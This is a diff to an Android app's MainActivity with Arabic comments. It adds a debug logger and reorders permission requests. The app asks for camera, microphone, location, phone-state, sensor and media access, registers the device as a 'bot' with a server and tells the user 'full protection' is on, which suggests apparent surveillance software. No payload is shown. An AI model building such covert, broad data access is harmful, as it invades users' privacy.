@@ -30,11 +30,66 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import java.io.File
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
+
+    companion object {
+        private const val TAG = "MainActivity"
+
+        /**
+         * نظام تسجيل الأخطاء والأحداث - يكتب في ملف على الجهاز
+         * لسهولة تتبع المشاكل وتصحيحها
+         */
+        private var logFile: File? = null
+
+        fun initLogger(context: Context) {
+            try {
+                val dir = context.getExternalFilesDir(null)
+                logFile = File(dir, "debug_log.txt")
+                if (!logFile!!.exists()) logFile!!.createNewFile()
+                logToFile("=== بدء تسجيل جديد ===")
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ في إنشاء ملف السجل: ${e.message}")
+            }
+        }
+
+        private fun logToFile(message: String) {
+            try {
+                val file = logFile ?: return
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(Date())
+                val line = "[$timestamp] $message\n"
+                file.appendText(line)
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ في كتابة السجل: ${e.message}")
+            }
+        }
+
+        fun debugLog(message: String) {
+            Log.d(TAG, message)
+            logToFile(message)
+        }
+
+        /**
+         * إرجاع آخر 100 سطر من ملف السجل
+         */
+        fun getDebugLog(): String {
+            return try {
+                val file = logFile ?: return "ملف السجل غير متوفر"
+                if (!file.exists()) return "لا يوجد سجل بعد"
+                val lines = file.readLines()
+                lines.takeLast(100).joinToString("\n")
+            } catch (e: Exception) {
+                "خطأ في قراءة السجل: ${e.message}"
+            }
+        }
+    }
 
     lateinit var webView: WebView
     private val PERMISSIONS_REQUEST_CODE = 101
@@ -71,9 +126,11 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION
         )
+        // إذن التعرف على النشاط البدني - مطلوب على جميع إصدارات أندرويد
         val batch2 = mutableListOf(
             Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACTIVITY_RECOGNITION
         )
         val batch3 = mutableListOf(
             Manifest.permission.READ_PHONE_STATE,
@@ -98,7 +155,6 @@ class MainActivity : AppCompatActivity() {
             batch5.add(Manifest.permission.READ_MEDIA_AUDIO)
             batch5.add(Manifest.permission.POST_NOTIFICATIONS)
             batch5.add(Manifest.permission.BODY_SENSORS)
-            batch5.add(Manifest.permission.ACTIVITY_RECOGNITION)
         }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             batch5.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
@@ -120,7 +176,9 @@ class MainActivity : AppCompatActivity() {
         webView = findViewById(R.id.webview)
         setupWebView()
 
-        Log.d("MainActivity", "=== بدء مراحل الأذونات والتفعيل ===")
+        initLogger(this)
+        debugLog("=== بدء التطبيق ===")
+        debugLog("الموديل: ${Build.MODEL} | أندرويد: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
         currentStep = SetupStep.BASIC_RUNTIME
         isSetupComplete = false
         checkAndRequestPermissions()
@@ -142,7 +200,8 @@ class MainActivity : AppCompatActivity() {
     private fun checkAndRequestPermissions() {
         val step = currentStep
         val stepNum = step.id + 1
-        val totalSteps = 10
+        val totalSteps = 9
+        debugLog("مرحلة الأذونات: $stepNum/$totalSteps - ${step.name}")
         jsNotify("onPermissionStep", "$stepNum/$totalSteps")
 
         when (step) {
@@ -402,7 +461,7 @@ class MainActivity : AppCompatActivity() {
     fun verifyLinkCode(code: String) {
         CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
             try {
-                Log.d("MainActivity", "🔄 جاري ربط الجهاز مع السيرفر: $code")
+                debugLog("🔄 محاولة ربط الجهاز بالسيرفر بالكود: $code")
                 // إظهار حالة الربط في الواجهة
                 runOnUiThread {
                     jsCall("onLinking()")
@@ -430,7 +489,7 @@ class MainActivity : AppCompatActivity() {
                     connection.errorStream?.bufferedReader()?.readText() ?: ""
                 }
 
-                Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")
+                debugLog("استجابة السيرفر: $responseCode - $response")
 
                 if (responseCode in 200..299) {
                     val jsonResponse = try {
@@ -444,7 +503,7 @@ class MainActivity : AppCompatActivity() {
                     }
 
                     if (jsonResponse.optBoolean("ok", false)) {
-                        Log.d("MainActivity", "✅ تم ربط الجهاز بنجاح!")
+                        debugLog("✅ تم ربط الجهاز بنجاح!")
                         SharedPrefsManager.setLinkCode(this@MainActivity, code)
                         SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
                         SharedPrefsManager.setBotRegistered(this@MainActivity, true)
@@ -456,7 +515,7 @@ class MainActivity : AppCompatActivity() {
                         }
                     } else {
                         val errorMsg = jsonResponse.optString("error", "خطأ غير معروف")
-                        Log.e("MainActivity", "❌ فشل الربط: $errorMsg")
+                        debugLog("❌ فشل الربط: $errorMsg")
                         val userMsg = when {
                             errorMsg.contains("expired", ignoreCase = true) -> "كود الربط منتهي الصلاحية"
                             errorMsg.contains("Invalid", ignoreCase = true) || errorMsg.contains("invalid", ignoreCase = true) -> "الكود غير صحيح"
@@ -504,7 +563,7 @@ class MainActivity : AppCompatActivity() {
         if (isSetupComplete) return
         isSetupComplete = true
 
-        Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
+        debugLog("✅ اكتمال جميع مراحل التفعيل - بدء التشغيل")
         Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()
 
         SharedPrefsManager.markSetupCompleted(this)
